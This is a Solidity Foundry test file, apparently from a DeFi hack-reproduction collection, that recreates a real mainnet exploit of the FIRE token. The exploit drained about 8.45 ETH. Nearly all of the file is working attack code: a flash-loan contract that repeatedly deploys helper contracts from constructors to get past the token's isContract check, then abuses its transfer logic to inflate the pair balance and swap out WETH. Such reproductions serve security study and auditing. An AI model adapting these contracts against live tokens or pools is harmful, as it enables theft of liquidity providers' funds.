// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 8.45 ETH (~$20K USD)
// Attacker : https://etherscan.io/address/0x81f48a87ec44208c691f870b9d400d9c13111e2e
// Attack Contract : https://etherscan.io/address/0x9776c0abe8ae3c9ca958875128f1ae1d5afafcb8
// Vulnerable Contract : https://etherscan.io/address/0x18775475f50557b96C63E8bbf7D75bFeB412082D
// Attack Tx : https://etherscan.io/tx/0xd20b3b31a682322eb0698ecd67a6d8a040ccea653ba429ec73e3584fa176ff2b
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x18775475f50557b96C63E8bbf7D75bFeB412082D#code
// L274-279, _transfer() function

// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant AAVEPool = 0xC13e21B648A5Ee794902342038FF3aDAB66BE987;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant FIRE = 0x18775475f50557b96C63E8bbf7D75bFeB412082D;
address constant UniPairWETHFIRE = 0xcC27779013a1ccA68D3d93c640aaC807891Fd029;

contract FireToken_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 20_869_375 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC attackerC = new AttackerC();
        vm.label(address(attackerC), "attackerC");

        attackerC.attack();

        console.log("Final balance in WETH:", attacker.balance);
    }
}

contract AttackerC {
    function attack() external {
        IFS(AAVEPool).flashLoanSimple(
            address(this),
            weth,
            20 ether,
            hex"00000000000000000000000018775475f50557b96c63e8bbf7d75bfeb412082d000000000000000000000000cc27779013a1cca68d3d93c640aac807891fd029000000000000000000000000000000000000000000000001158e460913d00000",
            0
        );

        uint256 balWETH = IERC20(weth).balanceOf(address(this));
        IFS(weth).withdraw(balWETH);
        msg.sender.call{value: balWETH}("");
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        while (true) {
            IFS(weth).withdraw(20 ether);
            try new AttackerC2{value: 20 ether}() { // To avoid `require(!isContract(to));` L258 FIRE contract
            } catch {
                break;
            }
        }

        IFS(weth).deposit{value: 20 ether}();

        IFS(weth).approve(AAVEPool, 20 ether);

        return true;
    }

    receive() external payable {}
}

contract AttackerC2 {
    constructor() public payable {
        IFS(weth).deposit{value: 20 ether}();
        IFS(weth).approve(UniswapV2Router02, type(uint256).max);
        IFS(FIRE).approve(UniswapV2Router02, type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = FIRE;
        IFS(UniswapV2Router02).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            20 ether, 0, path, address(this), block.timestamp
        );

        uint256 pairBal = IFS(FIRE).balanceOf(UniPairWETHFIRE);
        IERC20(FIRE).transfer(UniPairWETHFIRE, pairBal);

        address t0 = IFS(UniPairWETHFIRE).token0();
        (uint256 r0, uint256 r1,) = IFS(UniPairWETHFIRE).getReserves();
        uint256 pairBal2 = IFS(FIRE).balanceOf(UniPairWETHFIRE);
        uint256 amountOut = IFS(UniswapV2Router02).getAmountOut(pairBal2 - r0, r0, r1);
        IFS(UniPairWETHFIRE).swap(0, amountOut, address(this), "");
        uint256 balWETH = IERC20(weth).balanceOf(address(this));
        IERC20(weth).transfer(msg.sender, balWETH);
    }

    receive() external payable {}
}

interface IFS is IERC20 {
    // AAVE Pool
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;

    // WETH
    function withdraw(
        uint256
    ) external;
    function deposit() external payable;

    // UniswapV2Router02
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    // UniswapV2Pair
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}
